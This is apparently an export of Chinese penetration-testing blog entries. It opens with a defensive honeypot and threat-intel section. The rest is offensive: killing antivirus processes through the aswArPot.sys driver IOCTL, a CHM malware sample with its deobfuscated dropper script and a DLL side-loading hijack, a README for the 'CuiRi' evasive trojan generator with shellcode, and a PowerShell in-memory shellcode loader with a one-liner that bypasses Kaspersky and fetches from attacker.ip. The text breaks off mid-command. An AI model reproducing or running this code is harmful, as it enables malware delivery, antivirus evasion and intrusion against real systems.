title="基于威胁情报构筑动态防御体系"></a>基于威胁情报构筑动态防御体系</h1><p>日常威胁情报收集、处理与建模主要采取以下几方面策略：</p><p>1、将安全设备收集到的报警按照攻击行为分为端口扫描类、服务探测类、尝试攻击类、恶意代码类，4类。绝大部分攻击都是按照这四个步骤开展，再将监测到的攻击行为按攻击阶段进行分类。</p><p>2、基于对攻击行为事件序列的深入分析，为预测攻击和溯源提供依据，使用攻击行为的owasp分类和cve编号以及木马的执行顺序，为检测到的攻击行为进行编码，最终以字符串序列的形式，对每个攻击行为序列进行标识，将该序列在威胁情报库中应用威胁相似度计算模型，计算情报库中相似度高的攻击序列。</p><p>3、具体分析攻击行为的过程中，攻击者为了躲避检测，一般会采取低速、随机的扫描方式，结合数理统计等方法，反推出攻击者的攻击间隔分布，从而发现潜在攻击特性。</p><p>4、经汇总、筛选、清理，以攻击行为的响应时间、攻击间隔起止时间、顺序化的端口扫描列表、服务探测顺序、漏洞扫描顺序、恶意代码动作列表等维度，构建攻击特征数据库，形成威胁情报库，安全监测处置一体化目标。</p><h1 id="专有情报生产"><a href="#专有情报生产" class="headerlink" title="专有情报生产"></a>专有情报生产</h1><p>1、利用监测系统发现大量水利网内的攻击行为、漏洞情况、恶意文件、异常外联等告警数据，研判后发送至情报中心</p><p>2、情报中心将告警时间、告警原因、告警ip、资产ip等信息进行实时标准化和范式化，自动补充时间、来源等信息后，根据告警级别类型配置权重分数和生产情报的及格分数</p><p>3、完成情报制作后，通过restful api写入情报中心</p><p>4、对各单位提交统一格式的防守报告，情报中心利用基于深度学习的文本识别技术，自动提取出告警时间、告警原因、告警ip、资产ip等数据，之后进行同样处理完成制作。</p><h1 id="黑客指纹收集"><a href="#黑客指纹收集" class="headerlink" title="黑客指纹收集"></a>黑客指纹收集</h1><p>依托蜜罐系统生成黑客指纹库，指纹库融合了系统、设备、html5 webGL、HTML5 Canvas、第三方网站ID指纹等。</p><p>当攻击者访问蜜罐系统中的诱饵网页时，该页面会在黑客的机器上种植僵尸cookie。僵尸cookie遍布多处，难以删除，收集并形成独一无二的指纹信息，从而为黑客的捕获提供情报信息和溯源能力。</p><p>黑客在发起攻击时，若其已经登陆过百度、新浪、优酷等第三方网站，蜜罐系统能够捕获其登录id。二是通过分析黑客操作系统语言、时区、ip归属地等信息，判断是否为境外攻击者。</p><p>逐步发布仿真系统，结合最新的0day。推出一套全英文的业务仿真系统，在此站加载了反制诱饵。</p><p>暴力破解过程中使用的用户名、密码，补充至密码字典，用于日常内部弱密码检查，若用户名是企业名，需对该用户发出风险提醒。通过证书、代码标识等识别攻击者攻击工具，进行攻击者同源性分析。攻击成功后的外联地址，用于监测内部主机是否沦陷。下载的木马哈希，通过主机agent定时扫描服务器进程和启动项对应的文件哈希，判断是否有其他主机已经被控。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.40-gao-si-gao-can-360-he-jing-fang-hu-de-si-lu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.40-gao-si-gao-can-360-he-jing-fang-hu-de-si-lu/</url>
      
        <content type="html"><![CDATA[<p>使用的是 <code>aswArPot.sys</code>这个驱动，非常简单，熟悉驱动编写的很快会编写出POC，是前两天看到群友发的分析文章：</p><p><a href="https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/">https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/</a></p><pre class="line-numbers language-none"><code class="language-none">然后复现了一下，简单的才可以复现，难的就不会了，想上吊了，555...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><pre class="line-numbers language-none"><code class="language-none">总而言之，发送`0x9988c094`这个IOCTL即可，然后`DeviceIoControl`直接给PID即可，他是一个_CLIENT_ID结构，第二个UniqueThread我们不用管，所以直接发一个PID的地址过去就好。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应如下：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659490964006/18a8c1e879fa451499331a0326a10560.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659490964006/82c5f3cf47f04759a6284bfd177c2f55.png" alt="image.png"></p><p>调用情况：</p><pre class="line-numbers language-none"><code class="language-none">sub_14001DC80&nbsp;-&gt;&nbsp;sub_140018FF8&nbsp;-&gt;&nbsp;sub_140019D54&nbsp;-&gt;&nbsp;sub_140014890&nbsp;-&gt;&nbsp;sub_140014B60&nbsp;-&gt;&nbsp;sub_1400163F0&nbsp;-&gt;&nbsp;sub_1400216A0&nbsp;-&gt;&nbsp;DriverEntry<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">这里还有一点，可以看到原始POC在发送`0x9988c094`这个IOCTL的之前还有一个与这个驱动通信的过程使用的是`0x7299c004`.我也去尝试不先发送这个交互但是是没办法KILL掉的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POC的驱动交互代码：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659490964006/c492c497a8d44f349f8c5567ab12bac5.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.40-chm-hun-yao-qq-bai-li-yong-mian-sha-360-zhu-dong-fang-yu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.40-chm-hun-yao-qq-bai-li-yong-mian-sha-360-zhu-dong-fang-yu/</url>
      
        <content type="html"><![CDATA[<p>最近有一个网友发给我一个QQ图20190427141352.chm的文件，让我看看是不是木马。根据经验，这种CHM一般都是里面有个html文件，通过js调用com控件，然后间接执行释放出来的木马文件。</p><p>使用7z打开这个chm文件，可以看到里面果然有一些exe文件以及dll文件。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/eace087c93214285baa789b5567bf190.png" alt="image.png"></p><p>双击执行这个chm文件后，果然里面的PcOL.exe被执行了</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/7d5e8c1be53d4448b6b3410361ceb0f3.png" alt="image.png"></p><p>经过分析这个exe可不简单，不但有腾讯有效数字签名，还被添加到了启动项</p><pre class="line-numbers language-none"><code class="language-none">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Temp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意一下这个文件的路径是在下面</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\Public\Downloads\desktop\PcOL.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/c3ccadfefe6c44c6b44b877957ca23be.png" alt="image.png"></p><p>因此判断多数是白利用，利用腾讯正规签名程序加载恶意的dll文件执行，使用Procexp查看该进程加载的模块信息，果然发现一个未签名的DLL文件</p><p>C:\Users\Public\Downloads\desktop\HummerEngine.dll这个文件也是刚才双击运行chm文件时释放出来的。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/5d501f68d3aa45ab80cefd6081f52693.png" alt="image.png"></p><p>使用IDA分析简单看了下该文件，有个导出函数：RunQQHummerEngine</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/420a9581a1164b2bb5ab6d61904b0379.png" alt="image.png"></p><p>该函数内部有个函数用来添加启动项，另一个函数用来执行其他功能。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/4f3e208e16584546b79af3a089034058.png" alt="image.png"></p><p>为了测试，我编写了一个DLL文件，并导出一个名为RunQQHummerEngine的函数，在函数中打开计算器进程。</p><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"EXTERN_C  _declspec(dllexport) void RunQQHummerEngine(){  WinExec("calc.exe", SW_SHOW);}BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved ){switch (ul_reason_for_call)  {case DLL_PROCESS_ATTACH:case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;  }return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把这几个文件放在一起，运行PcOL.exe，弹出了计算器，我的360安全卫士并无任何提示。</p><pre class="line-numbers language-none"><code class="language-none">PcOL.exelibtcmalloc.dllHummerEngine.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/a50a9297705f41d4bbdcdbf5e1b1f7df.png" alt="image.png"></p><p>接下来CHM文件是怎么释放这些exe和dll并成功执行PcOL.exe的，使用7z解压CHM文件后，打开里面的PoCL.htm文件</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/bb144dbb930e45069710b9f16ac3c995.png" alt="image.png"></p><p>光看html文件，并无明显的恶意代码特征，很明显猫腻就在这段js里面，这段js经过压缩混淆后，传入eval函数。</p><p>eval函数是js内置函数，传入的字符串参数会当做js代码来执行。</p><pre class="line-numbers language-none"><code class="language-none">eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?"":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('f I(){}f U(){8 9=V W();9.13="C:\\\\d\\\\h\\\\e\\\\i\\\\11.12";T(9.15&gt;0||(9.b&gt;0&amp;&amp;9.c&gt;0)){O H}E{O Z}}f K(){8 s=G.14;8 7=s.10(":");k 7[7.p-1];k 7[1];k 7[0];8 6=7.Y(":");6=6.X(2,6.p-2);6=6.1f(/%1e/g," ");8 P=\'&lt;a r=x m="o:n-A-w-v-q" b=1 c=1&gt;\'+\'&lt;4 5="t" 3="u"&gt;\'+\'&lt;4 5="B" 3="Q::D"&gt;\'+\'&lt;4 5="z" 3=",1i.l,-1h C:\\\\d\\\\h\\\\e\\\\i \'+6+\'"&gt;\'+\'&lt;4 5="R" 3="S,1,1"&gt;\'+\'&lt;/a&gt;\'+\'&lt;a r=y m="o:n-A-w-v-q" b=1 c=1&gt;\'+\'&lt;4 5="t" 3="u"&gt;\'+\'&lt;4 5="B" 3="Q::D"&gt;\'+\'&lt;4 5="z" 3=",17.l,C:\\\\d\\\\h\\\\e\\\\i\\\\19.l"&gt;\'+\'&lt;4 5="R" 3="S,1,1"&gt;\'+\'&lt;/a&gt;\';M.N(\'L\').1c=P;T(U()==H){x.F();j.J("I()",1a);j.G.1b()}E{y.F();M.N(\'L\').16.1g=\'1d\'}}j.J("K()",18);',62,81,'|||value|PARAM|name|dir|arr|var|ImgObj|OBJECT|width|height|Users|Downloads|function||Public|desktop|window|delete|exe|classid|adb880a6|clsid|length|00aa003b7a11|id|str|Command|ShortCut|9377|11cf|||Item1|d8ff|Button||shortcut|else|Click|location|true|cwaitfuntime|setTimeout|cwaitfun|tt|document|getElementById|return|commodStr|Bitmap|Item2|273|if|isHasImg|new|Image|substring|join|false|split|img|jpg|src|href|fileSize|style|explorer|128|PcOL|1000|reload|innerHTML|none|20|replace|display|decompile|hh'.split('|'),0,{})<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>知道他传入的参数是一段字符串，我们可以拷贝出来，把eval换成console.log，这样就可以打印出来这段js代码的真实模样了。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1659491417059/75d6a2e262244b40966fc95fa39a4214.png" alt="image.png"></p><p>拿到js还原后的代码后，可以在这个网站在线格式化一下，看起来舒服一点</p><ul><li><a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></li></ul><pre class="line-numbers language-none"><code class="language-none">function cwaitfuntime() {}function isHasImg() {    var ImgObj = new Image();    ImgObj.src = "C:\\Users\\Public\\Downloads\\desktop\\img.jpg";    if (ImgObj.fileSize &gt; 0 || (ImgObj.width &gt; 0 &amp;&amp; ImgObj.height &gt; 0)) {        return true    } else {        return false    }}function cwaitfun() {    var str = location.href;    var arr = str.split(":");    delete arr[arr.length - 1];    delete arr[1];    delete arr[0];    var dir = arr.join(":");    dir = dir.substring(2, dir.length - 2);    dir = dir.replace(/%20/g, " ");    var commodStr = '&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;' + '&lt;PARAM name="Command" value="ShortCut"&gt;' + '&lt;PARAM name="Button" value="Bitmap::shortcut"&gt;' + '&lt;PARAM name="Item1" value=",hh.exe,-decompile C:\\Users\\Public\\Downloads\\desktop ' + dir + '"&gt;' + '&lt;PARAM name="Item2" value="273,1,1"&gt;' + '&lt;/OBJECT&gt;' + '&lt;OBJECT id=y classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;' + '&lt;PARAM name="Command" value="ShortCut"&gt;' + '&lt;PARAM name="Button" value="Bitmap::shortcut"&gt;' + '&lt;PARAM name="Item1" value=",explorer.exe,C:\\Users\\Public\\Downloads\\desktop\\PcOL.exe"&gt;' + '&lt;PARAM name="Item2" value="273,1,1"&gt;' + '&lt;/OBJECT&gt;';    document.getElementById('tt').innerHTML = commodStr;    if (isHasImg() == true) {        x.Click();        window.setTimeout("cwaitfuntime()", 1000);        window.location.reload()    } else {        y.Click();        document.getElementById('tt').style.display = 'none'    }}window.setTimeout("cwaitfun()", 128);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到是利用com控件clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11，双击时就会执行以下两条命令：</p><p><strong>1）释放到用户公用目录下</strong></p><pre class="line-numbers language-none"><code class="language-none">'&lt;PARAM name="Item1" value=",hh.exe,-decompile C:\\Users\\Public\\Downloads\\desktop ' + dir + '"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2）利用exolorer执行qq白利用</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;PARAM name="Item1" value=",explorer.exe,C:\\Users\\Public\\Downloads\\desktop\\PcOL.exe"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关于这个CHM利用这个 adb880a6-d8ff-11cf-9377-00aa003b7a11 COM控件，网上已经有很多例子了，只不过这个样本利用脚本变化莫测的特性，做了混淆免杀处理。</p><p>此时，我有一个大胆的想法，既然都可以利用chm执行js了，那为何不直接内嵌和.net的dll来反射注入呢？</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.39-cuiri-hong-dui-zhuan-yong-mian-sha-mu-ma-sheng-cheng-gong-ju/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.39-cuiri-hong-dui-zhuan-yong-mian-sha-mu-ma-sheng-cheng-gong-ju/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-简介："><a href="#0x01-简介：" class="headerlink" title="0x01 简介："></a>0x01 简介：</h3><pre class="line-numbers language-none"><code class="language-none">   ____   __    __    _____      ______      _____    / ___)  ) )  ( (   (_   _)    (   __ \    (_   _)  / /     ( (    ) )    | |       ) (__) )     | |   ( (       ) )  ( (     | |      (    __/      | |   ( (      ( (    ) )    | |       ) \ \  _     | |    \ \___   ) \__/ (    _| |__    ( ( \ \_))   _| |__   \____)  \______/   /_____(     )_) \__/   /_____( 摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CuiRi 是一款红队专用免杀木马生成器，该工具可以通过红队人员提供的一段 shellcode 快速生成一个绕过所有杀软的可执行木马。</p><p><strong>特点</strong></p><ul><li>1.基于 Syscall 进行免杀，且随机混淆，可过几乎所有杀软</li><li>2.内置 go-strip 对 Go 生成的木马进行编译信息抹除与程序信息混淆</li><li>3.工具本体只有 1 个 exe，搭配 Go 环境即可直接使用</li></ul><p>感谢 go-strip 作者 <a href="https://github.com/boy-hack" title="@boy-hack">@boy-hack</a></p><h3 id="0x02-使用："><a href="#0x02-使用：" class="headerlink" title="0x02 使用："></a>0x02 使用：</h3><p>从 <a href="https://github.com/NyDubh3/CuiRi/releases/tag/v1.0" title="release">release</a> 中下载二进制文件，并且在系统上安装 Go 语言环境，然后将 shellcode 保存到1个txt文件中，即可使用本工具生成免杀马。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">   ____   __    __    _____      ______      _____  / ___<span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">(</span> <span class="token punctuation">(</span>   <span class="token punctuation">(</span>_   _<span class="token punctuation">)</span>    <span class="token punctuation">(</span>   __ <span class="token punctuation">\</span>    <span class="token punctuation">(</span>_   _<span class="token punctuation">)</span> / /     <span class="token punctuation">(</span> <span class="token punctuation">(</span>    <span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token operator">|</span> <span class="token operator">|</span>       <span class="token punctuation">)</span> <span class="token punctuation">(</span>__<span class="token punctuation">)</span> <span class="token punctuation">)</span>     <span class="token operator">|</span> <span class="token operator">|</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>       <span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">(</span> <span class="token punctuation">(</span>     <span class="token operator">|</span> <span class="token operator">|</span>      <span class="token punctuation">(</span>    __/      <span class="token operator">|</span> <span class="token operator">|</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>      <span class="token punctuation">(</span> <span class="token punctuation">(</span>    <span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token operator">|</span> <span class="token operator">|</span>       <span class="token punctuation">)</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>  _     <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>___   <span class="token punctuation">)</span> <span class="token punctuation">\</span>__/ <span class="token punctuation">(</span>    _<span class="token operator">|</span> <span class="token operator">|</span>__    <span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">))</span>   _<span class="token operator">|</span> <span class="token operator">|</span>__  <span class="token punctuation">\</span>____<span class="token punctuation">)</span>  <span class="token punctuation">\</span>______/   /_____<span class="token punctuation">(</span>     <span class="token punctuation">)</span>_<span class="token punctuation">)</span> <span class="token punctuation">\</span>__/   /_____<span class="token punctuation">(</span>摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马警告：<span class="token number">1</span>.本工具仅用于企业内部测试，请勿用于任何非法犯罪活动，否则后果自负<span class="token number">2</span>.本工具需要Go语言环境，且使用时需要关闭杀软https://github.com/NyDubh3/CuiRi   Author:Dubh3<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Current Version: <span class="token number">1.0</span>Usage of CuiRi.exe:  <span class="token parameter variable">-f</span> string        通过shellcode生成免杀马  <span class="token parameter variable">-manual</span>        查看shellcode生成方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CuiRi 支持的 shellcode 格式分为以下两种：</p><p><strong>1.C语言字符串格式 shellcode：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"<span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\xe4">\xe4</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x52">\x52</span>"</span><span class="token string">"<span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x60">\x60</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x48">\x48</span>"</span><span class="token string">"<span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x4d">\x4d</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc9">\xc9</span>"</span><span class="token string">"<span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x7c">\x7c</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\x41">\x41</span>"</span><span class="token string">"<span class="token entity" title="\x01">\x01</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x48">\x48</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.纯十六进制数值格式 shellcode:</strong></p><p>注意：如果是从 Cobalt Strike 中生成的 bin 文件，请单独将 bin 里的十六进制复制保存到一个 txt 文件中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fce8 <span class="token number">8900</span> 0000 <span class="token number">6089</span> e531 d264 8b52 308b520c 8b52 148b <span class="token number">7228</span> 0fb7 4a26 31ff 31c0ac3c 617c 022c 20c1 cf0d 01c7 e2f0 <span class="token number">5257</span>8b52 108b 423c 01d0 8b40 <span class="token number">7885</span> c074 4a01d050 8b48 188b <span class="token number">5820</span> 01d3 e33c 498b 348b01d6 31ff 31c0 acc1 cf0d 01c7 38e0 75f4037d f83b 7d24 75e2 588b <span class="token number">5824</span> 01d3 668b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg">https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg</a></p><p><a href="https://wiki.wgpsec.org/knowledge/hw/2020-defend-tips.html">https://wiki.wgpsec.org/knowledge/hw/2020-defend-tips.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.38-yuan-cheng-jia-zai-fen-chi-mian-sha-fang-fa/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.38-yuan-cheng-jia-zai-fen-chi-mian-sha-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>远程加载的思路很简单，只需要将bin文件放到cs服务器上，利用远程读取shellcode的方式将恶意代码加载到<a href="https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&amp;spm=1001.2101.3001.7020">内存</a>执行即可。</p><p>下面代码直接从uri读取字节数组（对的，没仔细看）</p><pre class="line-numbers language-none"><code class="language-none"># remoteshell.ps1Set-StrictMode -Version 2function get_delegate_type {    Param (        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,        [Parameter(Position = 1)] [Type] $var_return_type = [Void]    )    $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])    $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')    $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')    return $var_type_builder.CreateType()}function get_proc_address {    Param ($var_module, $var_procedure)       $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')    $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))    return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))}If ([IntPtr]::size -eq 8) {    $client = New-Object Net.WebClient    [Byte[]]$var_code = $client.    DownloadData($args[0])    for ($x = 0; $x -lt $var_code.Count; $x++) {        $var_code[$x] = $var_code[$x] -bxor 26    }    $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualAlloc), (get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)    [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)    $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (get_delegate_type @([IntPtr]) ([Void])))    $var_runme.Invoke([IntPtr]::Zero)}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>出网的思路是，通过downloadstring下载上篇文章中的remoteshell.ps1文件并执行，但是需要绕过卡巴斯基对downloadstring操作的拦截。方法有很多种，我通过以下方式绕过：</p><pre class="line-numbers language-none"><code class="language-none"># commandpowershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://attacker.ip/payload.ps1')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powershell $string={Set-StrictMode -Version 2;function func_get_proc_address {Param ($var_module, $var_procedure);$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() ^| Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods');$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'));return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), 